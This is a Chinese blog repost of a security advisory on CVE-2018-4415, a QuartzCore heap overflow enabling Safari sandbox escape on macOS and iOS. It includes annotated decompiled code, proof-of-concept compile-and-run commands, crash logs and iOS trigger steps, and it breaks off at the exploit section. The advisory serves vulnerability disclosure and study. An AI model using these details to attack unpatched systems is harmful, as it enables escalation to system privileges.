<!DOCTYPE html>



  


<html class="theme-next muse use-motion" lang="zh-Hans">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/blog/publi/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/blog/publi/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/blog/publi/css/main.css?v=5.1.3" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/blog/publi/images/apple-touch-icon_.png?v=5.1.3">


  <link rel="icon" type="image/png" sizes="32x32" href="/blog/publi/images/favicon-32x32_.png?v=5.1.3">


  <link rel="icon" type="image/png" sizes="16x16" href="/blog/publi/images/favicon-16x16_.png?v=5.1.3">


  <link rel="mask-icon" href="/blog/publi/images/logo_.svg?v=5.1.3" color="#222">





  <meta name="keywords" content="MacOS,iOS,Safari,堆溢出,沙箱逃逸," />





  <link rel="alternate" href="/blog/publi/atom.xml" title="Ainassine's Blog" type="application/atom+xml" />






<meta name="description" content="转自SSD Advisory – iOS/macOS Safari Sandbox Escape via QuartzCore Heap Overflow  漏洞摘要QuratzCore，或者称之为CoreAnimation，是macOS和iOS用来创建动画图表的框架。CoreAnimation使用了一个独特的渲染模型">
<meta name="keywords" content="MacOS,iOS,Safari,堆溢出,沙箱逃逸">
<meta property="og:type" content="article">
<meta property="og:title" content="通过QuartzCore堆溢出实现Safari沙箱逃逸">
<meta property="og:url" content="http://blog.ainassine.cn/blog/public/2018/12/03/通过QuartzCore堆溢出实现Safari沙箱逃逸">
<meta property="og:site_name" content="Ainassine&#39;s Blog">
<meta property="og:description" content="转自SSD Advisory – iOS/macOS Safari Sandbox Escape via QuartzCore Heap Overflow  漏洞摘要QuratzCore，或者称之为CoreAnimation，是macOS和iOS用来创建动画图表的框架。CoreAnimation使用了一个独特的渲染模型，这个渲染模型的图像操作运行在一个独立的进程中。在macOS中，这个独立的进程">
<meta property="og:locale" content="zh-Hans">
<meta property="og:updated_time" content="2018-12-03T13:19:33.865Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="通过QuartzCore堆溢出实现Safari沙箱逃逸">
<meta name="twitter:description" content="转自SSD Advisory – iOS/macOS Safari Sandbox Escape via QuartzCore Heap Overflow  漏洞摘要QuratzCore，或者称之为CoreAnimation，是macOS和iOS用来创建动画图表的框架。CoreAnimation使用了一个独特的渲染模型，这个渲染模型的图像操作运行在一个独立的进程中。在macOS中，这个独立的进程">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/blog/publi/',
    scheme: 'Muse',
    version: '5.1.3',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://blog.ainassine.cn/blog/public/2018/12/03/通过QuartzCore堆溢出实现Safari沙箱逃逸"/>





<script>
    (function(){
        if(''){
            if (prompt('请输入文章密码') !== ''){
                alert('密码错误！');
                history.back();
            }
        }
    })();
</script>
  <title>通过QuartzCore堆溢出实现Safari沙箱逃逸 | Ainassine's Blog</title>
  





  <script type="text/javascript">
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "https://hm.baidu.com/hm.js?c38b095f890551bad6df876c160ff82c";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
  </script>




</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/blog/publi/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Ainassine's Blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle">记录一切零散和琐碎。</p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/blog/publi/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/blog/publi/about/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
            
            关于
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/blog/publi/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/blog/publi/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/blog/publi/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            归档
          </a>
        </li>
      

      
        <li class="menu-item menu-item-search">
          
            <a href="javascript:;" class="popup-trigger">
          
            
              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
            
            搜索
          </a>
        </li>
      
    </ul>
  

  
    <div class="site-search">
      
  <div class="popup search-popup local-search-popup">
  <div class="local-search-header clearfix">
    <span class="search-icon">
      <i class="fa fa-search"></i>
    </span>
    <span class="popup-btn-close">
      <i class="fa fa-times-circle"></i>
    </span>
    <div class="local-search-input-wrapper">
      <input autocomplete="off"
             placeholder="搜索..." spellcheck="false"
             type="text" id="local-search-input">
    </div>
  </div>
  <div id="local-search-result"></div>
</div>



    </div>
  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://blog.ainassine.cn/blog/public/blog/publi/2018/12/03/通过QuartzCore堆溢出实现Safari沙箱逃逸">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Ainassine">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/blog/publi/images/1.png">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Ainassine's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">通过QuartzCore堆溢出实现Safari沙箱逃逸</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-12-03T19:37:13+08:00">
                2018-12-03
              </time>
            

            
              <span class="post-meta-divider">|</span>
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-check-o"></i>
              </span>
              
                <span class="post-meta-item-text">更新于&#58;</span>
              
              <time title="更新于" itemprop="dateModified" datetime="2018-12-03T21:19:33+08:00">
                2018-12-03
              </time>
            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/blog/publi/categories/安全/" itemprop="url" rel="index">
                    <span itemprop="name">安全</span>
                  </a>
                </span>

                
                
                  ， 
                
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/blog/publi/categories/安全/沙箱逃逸/" itemprop="url" rel="index">
                    <span itemprop="name">沙箱逃逸</span>
                  </a>
                </span>

                
                
                  ， 
                
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/blog/publi/categories/安全/沙箱逃逸/堆溢出/" itemprop="url" rel="index">
                    <span itemprop="name">堆溢出</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          
             <span id="/blog/publi/2018/12/03/通过QuartzCore堆溢出实现Safari沙箱逃逸" class="leancloud_visitors" data-flag-title="通过QuartzCore堆溢出实现Safari沙箱逃逸">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数&#58;</span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  2,286 words
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  12 min
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <blockquote>
<p>转自<a href="https://blogs.securiteam.com/index.php/archives/3796" target="_blank" rel="noopener">SSD Advisory – iOS/macOS Safari Sandbox Escape via QuartzCore Heap Overflow</a></p>
</blockquote>
<h1 id="漏洞摘要"><a href="#漏洞摘要" class="headerlink" title="漏洞摘要"></a>漏洞摘要</h1><p><a href="https://developer.apple.com/documentation/quartzcore" target="_blank" rel="noopener">QuratzCore</a>，或者称之为<code>CoreAnimation</code>，是macOS和iOS用来创建动画图表的框架。<code>CoreAnimation</code>使用了一个独特的渲染模型，这个渲染模型的图像操作运行在一个独立的进程中。在macOS中，这个独立的进程是<code>WindowServer</code>，在iOS中，这个独立的进程是<code>backboardd</code>，他们都不在沙箱内，并且有权限执行<code>setuid</code>命令。作为服务，<code>QuartzCore</code>常被称作<code>CARenderServer</code>。它存在于macOS和iOS上，并且可以在Safari沙箱内被获取到，因此，他曾在多种场景下被用在<code>Pwn2Own</code>上。在最新版本macOS和iOS上的<code>QuartzCore</code>中存在着会导致<em>堆溢出</em>的<em>整型溢出漏洞</em>。</p>
<h1 id="厂商回应"><a href="#厂商回应" class="headerlink" title="厂商回应"></a>厂商回应</h1><p>“CoreAnimation Impact: An application may be able to execute arbitrary code with system privileges<br>Description: A memory corruption issue was addressed with improved memory handling.<br>CVE-2018-4415: Beyond Security’s SecuriTeam Secure Disclosure”</p>
<blockquote>
<p>CoreAnimation影响：应用有可能以系统权限执行任意代码。<br>描述：内存崩溃的问题通过改进的内存处理被解决。<br>CVE-2018-4415: Beyond Security’s SecuriTeam Secure Disclosure</p>
</blockquote>
<h1 id="CVE"><a href="#CVE" class="headerlink" title="CVE"></a>CVE</h1><p><strong>CVE-2018-4415</strong></p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p>将本漏洞报告给<code>Beyond Security’s SecuriTeam Secure Disclosure</code>项目的一位独立的安全研究员。</p>
<h1 id="影响系统"><a href="#影响系统" class="headerlink" title="影响系统"></a>影响系统</h1><p>macOS 10.14<br>iOS 12.10</p>
<h1 id="漏洞细节"><a href="#漏洞细节" class="headerlink" title="漏洞细节"></a>漏洞细节</h1><p>漏洞产生的根本在于<code>QuartzCore</code>的<code>CA::Render::InterpolatedFunction::InterpolatedFunction</code>函数，这个函数没有考虑到整型溢出的情况。在接下来的内容中我们将讨论一下macOS和iOS上本漏洞的一些细节。</p>
<h2 id="macOS-10-14"><a href="#macOS-10-14" class="headerlink" title="macOS 10.14"></a>macOS 10.14</h2><p>在macOS上有一个追踪<code>CARenderService</code>非常好用的API，名为<code>CGSCreateLayerContext</code>（iOS上没有该API）。攻击者可以发送id为<code>0x9C42</code>或者<code>0x9C43</code>的消息给服务端口。当进程（事实上是server_thread)接收到这份特定id的消息时，它会进入到一种类似于反序列化的程序。如果提供了合适的数据，执行流会进入到函数<code>CA::Render::InterpolatedFunction::InterpolatedFunction</code>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall CA::Render::InterpolatedFunction::InterpolatedFunction(CA::Render::InterpolatedFunction *<span class="keyword">this</span>, CA::Render::Decoder *a2)</span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    *((_DWORD *)<span class="keyword">this</span> + <span class="number">2</span>) = <span class="number">2</span>;</span><br><span class="line">    *((_DWORD *)<span class="keyword">this</span> + <span class="number">2</span>) = <span class="number">1</span>;</span><br><span class="line">    ++dword_2911E8;</span><br><span class="line">    v2 = a2;</span><br><span class="line">    *(_QWORD *)<span class="keyword">this</span> = off_2652D8;</span><br><span class="line">    *((_QWORD *)<span class="keyword">this</span> + <span class="number">2</span>) = CA::Render::Decoder::<span class="keyword">decode_size_t</span>(a2); <span class="comment">// &lt;----- (b)</span></span><br><span class="line">    *((_QWORD *)<span class="keyword">this</span> + <span class="number">6</span>) = CA::Render::Decoder::decode_int32(a2); <span class="comment">// &lt;----- (a)</span></span><br><span class="line">    v3 = *((_QWORD *)<span class="keyword">this</span> +<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        v5 = (*((_QWORD *)<span class="keyword">this</span> + <span class="number">2</span>) &gt;&gt; <span class="number">1</span>) | *((_QWORD *)<span class="keyword">this</span> + <span class="number">2</span>) &amp; <span class="number">1L</span>L;</span><br><span class="line">        v4 = (<span class="keyword">float</span>)(<span class="keyword">signed</span> <span class="keyword">int</span>)v5 + (<span class="keyword">float</span>)(<span class="keyword">signed</span> <span class="keyword">int</span>)v5;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        v4 = (<span class="keyword">float</span>)(<span class="keyword">signed</span> <span class="keyword">int</span>)v3;</span><br><span class="line">    &#125;</span><br><span class="line">    *((<span class="keyword">float</span> *)<span class="keyword">this</span> +<span class="number">7</span>) = v4 + <span class="number">-1.0</span>;</span><br><span class="line">    *((_QWORD *)<span class="keyword">this</span> + <span class="number">6</span>) = <span class="number">0L</span>L;</span><br><span class="line">    *((_QWORD *)<span class="keyword">this</span> + <span class="number">5</span>) = <span class="number">0L</span>L;</span><br><span class="line">    *((_QWORD *)<span class="keyword">this</span> + <span class="number">4</span>) = <span class="number">0L</span>L;</span><br><span class="line">    result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)CA::Render::Decoder::decode_int32(a2) &lt;&lt; <span class="number">16</span>;</span><br><span class="line">    _InterlockedOr((<span class="keyword">volatile</span> <span class="keyword">signed</span> __int32 *)<span class="keyword">this</span> +<span class="number">2</span>, result); <span class="comment">// &lt;----- (c)</span></span><br><span class="line">    v7 = *((_QWORD *)<span class="keyword">this</span> + <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v7 ) &#123;</span><br><span class="line">        CA::Render:InterpolatedFunction::allocate_storage(<span class="keyword">this</span>, (<span class="keyword">char</span> *)result, v7);</span><br><span class="line">        v8 = (<span class="keyword">void</span> *)*((_QWORD *)<span class="keyword">this</span> + <span class="number">4</span>);</span><br><span class="line">        <span class="keyword">if</span> ( v8 ) &#123;</span><br><span class="line">            CA::Render::Decoder::decode_bytes(v2, v8, <span class="number">4</span> * *((_QWORD *)<span class="keyword">this</span> + <span class="number">2</span>) * *((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)<span class="keyword">this</span> + <span class="number">6</span>)); <span class="comment">// &lt;----- (f)</span></span><br><span class="line">            ...</span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注意到在(a)和(b)两个位置，他们俩的值可以被攻击者控制（CA使用类似<code>CA::Render::Decoder::decode*</code> 的函数去反序列化对象），并且在<code>CA::Render::InterpolatedFunction::allocate_storage</code>函数中，这些值将被用于决定分配内存的大小。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> *__usercall CA::Render::InterpolatedFunction::allocate_storage@&lt;rax&gt;(CA::Render::InterpolatedFunction *<span class="keyword">this</span>@&lt;rdi&gt;, <span class="keyword">char</span> *result@&lt;rax&gt;, __int64 a3@&lt;rsi&gt;)</span><br><span class="line">&#123;</span><br><span class="line">    __int64 v3; <span class="comment">// r14</span></span><br><span class="line">    __int64 v4; <span class="comment">// t15</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> ( a3 )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( !*((_QWORD *)<span class="keyword">this</span> + <span class="number">4</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">            v3 = a3 * *((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)<span class="keyword">this</span> + <span class="number">6</span>); <span class="comment">// &lt;----- (d)</span></span><br><span class="line">            v4 = <span class="number">0L</span>L;</span><br><span class="line">            <span class="keyword">if</span> ( *((_QWORD *)<span class="keyword">this</span> + <span class="number">2</span>) &amp; <span class="number">0x20000</span> )</span><br><span class="line">                v4 = a3; <span class="comment">// &lt;----- (e)</span></span><br><span class="line">            result = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">4</span> * (v4 + v3));</span><br><span class="line">            *((_QWORD *)<span class="keyword">this</span> + <span class="number">4</span>) = result;</span><br><span class="line">            <span class="keyword">if</span> ( v4 )</span><br><span class="line">            &#123;</span><br><span class="line">                result += <span class="number">4</span> * v3;</span><br><span class="line">                *((_QWORD *)<span class="keyword">this</span> + <span class="number">5</span>) = result;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( !*((_QWORD *)<span class="keyword">this</span> + <span class="number">6</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> ( *((_QWORD *)<span class="keyword">this</span> + <span class="number">2</span>) &amp; <span class="number">0x40000</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                result = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">32L</span>L * *((_QWORD *)<span class="keyword">this</span> + <span class="number">2</span>));</span><br><span class="line">                *((_QWORD *)<span class="keyword">this</span> + <span class="number">6</span>) = result;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在(d)处，<code>v3</code>可以被(a)和(b)处的值控制。由此(e)处的<code>v4</code>同样可以被攻击者控制。所以将要被分配的内存大小是<code>4 * (v4 + v3)</code>。但是仔细观察(f)处发现，传递给<code>CA::Render::Decoder::decode_bytes</code>的第三个参数实际为<code>4 * v3</code>。(f)处<code>CA::Render::Decoder::decode_bytes</code>最简单的形式类似<code>memcpy(v2, v8, 4 * v3)</code>或者<code>memset(v2, 0, 4 * v3)</code>。所以整型溢出导致的堆溢出发生在<code>4 * (v4 + v3)</code>溢出但<code>4 * v3</code>不溢出的时候。那些能够导致合适整型溢出的攻击者控制的值证据集均可在文末提供的漏洞利用中发现。</p>
<p>在macOS上复现：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">clang QuartzCoreFunctionIntOverFlow.c -o quartz_core_function_over_flow -framework CoreGraphics</span><br><span class="line">./quartz_core_function_over_flow</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">1 Thread 0 Crashed:: Dispatch queue: com.apple.main−thread</span><br><span class="line">com.apple.CoreFoundation 0x00007fff332e2daf __CFBasicHashAddValue + 2077</span><br><span class="line">com.apple.CoreFoundation 0x00007fff332e33f5 CFDictionarySetValue + 187</span><br><span class="line">com.apple.SkyLight 0x00007fff595ebfa9 CGXPostPortNotification + 123</span><br><span class="line">com.apple.SkyLight 0x00007fff595eb947 notify_handler + 73</span><br><span class="line">com.apple.SkyLight 0x00007fff595eb2d9 post_port_data + 237</span><br><span class="line">com.apple.SkyLight 0x00007fff595eafba run_one_server_pass + 949</span><br><span class="line">com.apple.SkyLight 0x00007fff595eab90 CGXRunOneServicesPass + 460</span><br><span class="line">com.apple.SkyLight 0x00007fff595eb820 server_loop + 96</span><br><span class="line">com.apple.SkyLight 0x00007fff595eb7b5 SLXServer + 1153</span><br><span class="line">WindowServer 0x000000010011d4c4 0x10011c000 + 5316</span><br><span class="line">libdyld.dylib 0x00007fff6036ced5 start + 1</span><br><span class="line">Thread 2:: com.apple.coreanimation.render−server // CARenderServer thread</span><br><span class="line">libsystem_platform.dylib 0x00007fff6056ce09 _platform_bzero$VARIANT$Haswell</span><br><span class="line">+ 41</span><br><span class="line">com.apple.QuartzCore 0x00007fff3e8ebaa4 CA::Render::Decoder::</span><br><span class="line">decode_bytes(void*, unsigned long) + 46</span><br><span class="line">com.apple.QuartzCore 0x00007fff3e8c35f7 CA::Render::InterpolatedFunction</span><br><span class="line">::InterpolatedFunction(CA::Render::Decoder*) + 191</span><br><span class="line">com.apple.QuartzCore 0x00007fff3e8c3524 CA::Render::Function::decode(CA</span><br><span class="line">::Render::Decoder*) + 224</span><br><span class="line">com.apple.QuartzCore 0x00007fff3e8ecb8a CA::Render::Decoder::</span><br><span class="line">decode_object(CA::Render::Type) + 946</span><br><span class="line">com.apple.QuartzCore 0x00007fff3e8edc8e CA::Render::decode_commands(CA::</span><br><span class="line">Render::Decoder*) + 871</span><br><span class="line">com.apple.QuartzCore 0x00007fff3e896422 CA::Render::Server::</span><br><span class="line">ReceivedMessage::run_command_stream() + 748</span><br><span class="line">com.apple.QuartzCore 0x00007fff3e73d2e1 CA::Render::Server::</span><br><span class="line">server_thread(void*) + 1841</span><br><span class="line">com.apple.QuartzCore 0x00007fff3e91427c thread_fun(void*) + 25</span><br><span class="line">libsystem_pthread.dylib 0x00007fff60572795 _pthread_body + 159</span><br><span class="line">libsystem_pthread.dylib 0x00007fff605726e2 _pthread_start + 70</span><br><span class="line">libsystem_pthread.dylib 0x00007fff605722a9 thread_start + 13</span><br></pre></td></tr></table></figure>
<h2 id="iOS-12-10"><a href="#iOS-12-10" class="headerlink" title="iOS 12.10"></a>iOS 12.10</h2><p>因为本问题产生的原因十分明显，并且macOS和iOS的代码基本上一样，在本部分中，我们只讨论iOS与MacOS不同的地方。</p>
<p>· macOS上并没有像<code>CGSCreateLayerContext</code>一样能够直接获取<code>CoreAnimation</code>渲染上下文的API，但是在探索中，我们发现<code>MIG</code>函数<code>_XRegisterClient</code>可以被用来代替<code>CGSCreateLayerContext</code>。首先，攻击者应该打开<code>com.apple.CARenderServer</code>服务（可以在沙箱内获取），然后通过ID为<code>40202</code>的<code>mach_msg</code>调用<code>_XRegisterClient</code>。<br>· 为了在<code>iOS 12 beta</code>中复现本漏洞，你应该使用最新的<code>1Xcode-beta</code>（为了最新的SDK）。<br>· 你应该根据www.malhal.com引入IOKit框架头。注意，目的目录应该更改为你的Xcode-beta应用。<br>· 代码应该放在<code>application didFinishLaunchingWithOptions</code>函数中，这样当程序运行时就会触发执行。<br>· 当程序被安装好之后，启动<code>applicationios-sbe</code>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">1 Thread 3 name: com.apple.coreanimation.render−server // CARenderServer thread</span><br><span class="line">2 Thread 3:</span><br><span class="line">0 libsystem_platform.dylib 0x000000018fefe584 0x18fef6000 + 34180</span><br><span class="line">1 QuartzCore 0x0000000194a6e1d4 0x19491e000 + 1376724</span><br><span class="line">2 QuartzCore 0x0000000194a21a58 0x19491e000 + 1063512</span><br><span class="line">3 QuartzCore 0x0000000194a710b8 0x19491e000 + 1388728</span><br><span class="line">4 QuartzCore 0x0000000194a719c0 0x19491e000 + 1391040</span><br><span class="line">5 QuartzCore 0x00000001949fb140 0x19491e000 + 905536</span><br><span class="line">6 QuartzCore 0x00000001949facdc 0x19491e000 + 904412</span><br><span class="line">7 QuartzCore 0x0000000194ab65c8 0x19491e000 + 1672648</span><br><span class="line">8 libsystem_pthread.dylib 0x000000018ff0c26c 0x18ff01000 + 45676</span><br><span class="line">9 libsystem_pthread.dylib 0x000000018ff0c1b0 0x18ff01000 + 45488</span><br><span class="line">10 libsystem_pthread.dylib 0x000000018ff0fd20 0x18ff01000 + 60704</span><br><span class="line"></span><br><span class="line">Thread 13 name: Dispatch queue: com.apple.libdispatch−manager</span><br><span class="line">Thread 13 Crashed:</span><br><span class="line">0 libdispatch.dylib 0x000000018fd18514 0x18fcca000 + 320788</span><br><span class="line">1 libdispatch.dylib 0x000000018fd1606c 0x18fcca000 + 311404</span><br><span class="line">2 libdispatch.dylib 0x000000018fd1606c 0x18fcca000 + 311404</span><br><span class="line">3 libdispatch.dylib 0x000000018fd0f1ac 0x18fcca000 + 283052</span><br><span class="line">4 libsystem_pthread.dylib 0x000000018ff0d078 0x18ff01000 + 49272</span><br><span class="line">5 libsystem_pthread.dylib 0x000000018ff0fd18 0x18ff01000 + 60696</span><br></pre></td></tr></table></figure>
<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span 